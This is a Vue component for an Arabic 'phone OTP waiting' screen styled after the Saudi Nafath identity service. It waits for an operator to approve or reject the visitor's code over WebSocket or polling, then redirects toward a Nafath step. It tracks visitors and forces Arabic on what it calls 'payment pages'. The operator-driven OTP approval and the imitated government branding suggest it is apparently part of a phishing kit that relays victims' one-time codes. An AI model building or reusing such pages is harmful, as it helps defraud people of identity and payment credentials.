<template>
    <div class="min-h-screen relative overflow-hidden" dir="rtl">
        <!-- Background -->
        <div class="absolute inset-0 z-0">
            <div class="absolute inset-0 bg-linear-to-b from-[#000062]/95 via-[#000062]/85 to-[#000062]/95"></div>
        </div>

        <!-- Main Content -->
        <div class="relative z-10 flex flex-col items-center justify-center min-h-screen px-4 py-8">
            <div class="w-full max-w-md">
                <!-- Main Card (Nafath Style) -->
                <div class="card-nafath text-center">
                    <div class="p-6 md:p-8">
                        <!-- Logo -->
                        <img src="/images/icons/gate_logo_indv_light.svg"
                            :alt="t( 'verification.phoneOtpWaiting.logo' )" class="h-16 md:h-20 w-auto mx-auto mb-6" width="120" height="80"
                            @error="$event.target.style.display = 'none'" />

                        <!-- Title -->
                        <h1 class="font-bold text-white text-xl md:text-2xl mb-3">
                            {{ t( 'verification.phoneOtpWaiting.title' ) }}
                        </h1>
                        <p class="text-white/70 mb-6 text-sm">
                            {{ t( 'verification.phoneOtpWaiting.pleaseWait' ) }}
                        </p>

                        <!-- Waiting State -->
                        <div v-if="status === 'pending'">
                            <div class="flex justify-center mb-6">
                                <div class="phone-loader">
                                    <div class="phone-loader__dot"></div>
                                    <div class="phone-loader__dot"></div>
                                    <div class="phone-loader__dot"></div>
                                </div>
                            </div>
                        </div>

                        <!-- Approved State -->
                        <div v-else-if="status === 'approved'">
                            <div class="text-center my-6 inline-flex flex-col gap-3">
                                <div
                                    class="w-16 h-16 mx-auto bg-emerald-500 rounded-full flex items-center justify-center">
                                    <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd"
                                            d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                            clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <span class="font-bold text-white text-xl">
                                    {{ t( 'verification.phoneOtpWaiting.approvedTitle' ) }}
                                </span>
                            </div>
                            <div class="flex items-center justify-center gap-3 mt-4">
                                <div class="phone-loader phone-loader--sm">
                                    <div class="phone-loader__dot"></div>
                                    <div class="phone-loader__dot"></div>
                                    <div class="phone-loader__dot"></div>
                                </div>
                                <span class="text-white">
                                    {{ t( 'verification.phoneOtpWaiting.approvedSubtitle' ) }}
                                </span>
                            </div>
                        </div>

                        <!-- Rejected State -->
                        <div v-else-if="status === 'rejected'">
                            <div class="text-center my-6 inline-flex flex-col gap-3">
                                <div
                                    class="w-16 h-16 mx-auto bg-red-500 rounded-full flex items-center justify-center">
                                    <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd"
                                            d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                                            clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <span class="font-bold text-white text-xl">
                                    {{ t( 'verification.phoneOtpWaiting.rejectedTitle' ) }}
                                </span>
                                <p class="text-white/70 text-sm">
                                    {{ rejectReason || t( 'verification.phoneOtpWaiting.rejectedMessage' ) }}
                                </p>
                            </div>
                            <div class="mt-6">
                                <button class="btn-outline-light w-full py-3 px-6 rounded-xl font-semibold transition-all cursor-pointer"
                                    @click="retryOtp">
                                    {{ t( 'common.retry' ) }}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Security Notice -->
                <div class="mt-6 text-center">
                    <div class="inline-flex items-center gap-2 text-white/50 text-xs">
                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                                clip-rule="evenodd" />
                        </svg>
                        <span>{{ t( 'verification.phoneOtpWaiting.secureConnection' ) }}</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import { getReasonLabel } from '@/constants/rejectionReasons';
import { getEcho } from '@/services/echo';
import { customerBroadcastChannel } from '@/utils/customerBroadcastChannel';

const { t } = useI18n();
const router = useRouter();

// Track this page
useVisitorTracking( 'phone/otp-waiting' );

// ─── Load context from sessionStorage (with protection) ─────────────
function loadPhoneOtpContext ()
{
    try {
        return JSON.parse( sessionStorage.getItem( 'phoneOtpContext' ) || '{}' );
    } catch ( error ) {
        logger.error( '[PhoneOtpWaiting] Failed to parse phoneOtpContext:', error );
        return {};
    }
}

const phoneOtpContext = loadPhoneOtpContext();
const _phoneNumber = phoneOtpContext.phoneNumber || '';
const phoneSessionId = phoneOtpContext.sessionId || '';
const phoneStatusSig = phoneOtpContext.statusSig || '';

// NOTE: OTP code should NEVER be stored in sessionStorage or sent to client.
// It must remain server-side only, never exposed to JavaScript.

// ─── Status ─────────────────────────────────────────────────────────
const status = ref( 'pending' ); // pending | approved | rejected
const rejectReason = ref( '' );

// ─── Validation: ensure session data is present ──────────────────────
function validateSession ()
{
    if ( !phoneSessionId || !phoneStatusSig ) {
        logger.error( '[PhoneOtpWaiting] Missing session ID or status signature' );
        status.value = 'rejected';
        rejectReason.value = t( 'verification.phoneOtpWaiting.invalidSession' );
        return false;
    }
    return true;
}

// ─── Retry — go back to phone verification entry ────────────────────
function retryOtp ()
{
    clearAllTimers();
    router.push( { name: 'phoneVerification' } );
}

// ─── WebSocket — listen for admin approval / rejection ──────────────
let echo = null;
let echoChannel = null;
let echoChannelName = '';
let isUnmounted = false;

async function setupWebSocket ()
{
    if ( isUnmounted || !validateSession() ) return;

    try {
        echo = await getEcho();

        if ( isUnmounted ) return;

        if ( !echo ) {
            logger.warn( '[PhoneOtpWaiting] Echo/Reverb not available, using polling only' );
            return;
        }

        const channelName = await customerBroadcastChannel( 'phone', phoneSessionId );
        logger.debug( '[PhoneOtpWaiting] Subscribing to channel:', channelName );

        echoChannel = echo.channel( channelName );
        echoChannelName = channelName;

        echoChannel.listen( '.PhoneOtpApproved', handleApproved );
        echoChannel.listen( '.PhoneOtpRejected', handleRejected );
    } catch ( error ) {
        logger.error( '[PhoneOtpWaiting] WebSocket setup failed:', error );
        logger.warn( '[PhoneOtpWaiting] Falling back to polling only' );
        // Polling will handle it
    }
}

function handleApproved ( event )
{
    // Prevent duplicate handling
    if ( status.value !== 'pending' ) return;

    logger.debug( '[PhoneOtpWaiting] Approved:', event );
    status.value = 'approved';

    const redirectTimeout = setTimeout( () =>
    {
        if ( event.redirect_to ) {
            safeRedirect( event.redirect_to, 'nafathRedirecting', router );
        } else {
            // Navigate to Nafath after phone verification approval
            router.push( { name: 'nafathRedirecting' } );
        }
    }, 2000 );

    // Store timeout ID for cleanup
    timeoutIds.push( redirectTimeout );
}

function handleRejected ( event )
{
    // Prevent duplicate handling
    if ( status.value !== 'pending' ) return;

    logger.debug( '[PhoneOtpWaiting] Rejected:', event );
    status.value = 'rejected';
    rejectReason.value = getReasonLabel( event.reason || 'phone_otp_other', t ) || t( 'verification.phoneOtpWaiting.rejectedMessage' );
}

// ─── Polling Fallback ───────────────────────────────────────────────
// Note: The global tracking system (initGlobalTracking) already handles
// /customer/page heartbeats. This polling only checks approval status.
let pollTimer = null;
let pollInFlight = false;

async function pollStatus ()
{
    if ( pollInFlight || status.value !== 'pending' ) return;

    pollInFlight = true;

    try {
        const sid = phoneSessionId;
        const sig = phoneStatusSig;

        if ( !sid || !sig ) {
            pollInFlight = false;
            return;
        }

        const { default: request } = await import( '@/api/request' );
        const { data } = await request.get( `/status/phone/${ sid }?sig=${ encodeURIComponent( sig ) }` );

        if ( isUnmounted ) return;

        if ( data.status === 'verified' ) {
            handleApproved( data );
        } else if ( data.status === 'rejected' ) {
            handleRejected( { reason: data.reason || 'phone_otp_other' } );
        }
    } catch ( error ) {
        logger.debug( '[PhoneOtpWaiting] Polling error (expected fallback):', error.message );
    } finally {
        pollInFlight = false;
    }
}

function startPolling ()
{
    if ( pollTimer ) return;

    // First check immediately
    pollStatus();

    // Then schedule recurring checks
    pollTimer = setInterval( pollStatus, 30_000 );
}

// ─── Cleanup helpers ────────────────────────────────────────────────
const timeoutIds = [];

function clearAllTimers ()
{
    // Clear redirect timeout
    timeoutIds.forEach( id => clearTimeout( id ) );
    timeoutIds.length = 0;

    // Clear polling
    if ( pollTimer ) {
        clearInterval( pollTimer );
        pollTimer = null;
    }

    // Leave Echo channel (use stored instance)
    if ( echo && echoChannelName ) {
        try {
            echo.leave( echoChannelName );
        } catch ( error ) {
            logger.debug( '[PhoneOtpWaiting] Echo.leave() error:', error );
        }
    }

    echoChannel = null;
    echoChannelName = '';
}

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    // Validate session first
    if ( !validateSession() ) {
        return;
    }

    setupWebSocket();
    startPolling();
} );

onUnmounted( () =>
{
    isUnmounted = true;
    clearAllTimers();
} );
</script>

<style scoped>
.card-nafath {
    background: rgba(0, 0, 50, 0.4);
    backdrop-filter: blur(24px) saturate(180%);
    -webkit-backdrop-filter: blur(24px) saturate(180%);
    border-radius: 24px;
    border: 1px solid rgba(255, 255, 255, 0.15);
    box-shadow:
        0 25px 50px -12px rgba(0, 0, 0, 0.5),
        inset 0 1px 0 rgba(255, 255, 255, 0.1);
}

.btn-outline-light {
    background: rgba(255, 255, 255, 0.08);
    border: 1.5px solid rgba(255, 255, 255, 0.25);
    color: white;
}

.btn-outline-light:hover {
    background: rgba(255, 255, 255, 0.15);
    border-color: rgba(255, 255, 255, 0.4);
}

/* Dot loader */
.phone-loader {
    display: flex;
    gap: 6px;
    align-items: center;
}

.phone-loader--sm .phone-loader__dot {
    width: 6px;
    height: 6px;
}

.phone-loader__dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: white;
    animation: dotPulse 1.4s ease-in-out infinite;
}

.phone-loader__dot:nth-child(2) {
    animation-delay: 0.2s;
}

.phone-loader__dot:nth-child(3) {
    animation-delay: 0.4s;
}

@keyframes dotPulse {

    0%,
    80%,
    100% {
        opacity: 0.3;
        transform: scale(0.8);
    }

    40% {
        opacity: 1;
        transform: scale(1);
    }
}

@media (max-width: 640px) {
    .card-nafath {
        margin: 0 8px;
    }
}
</style>
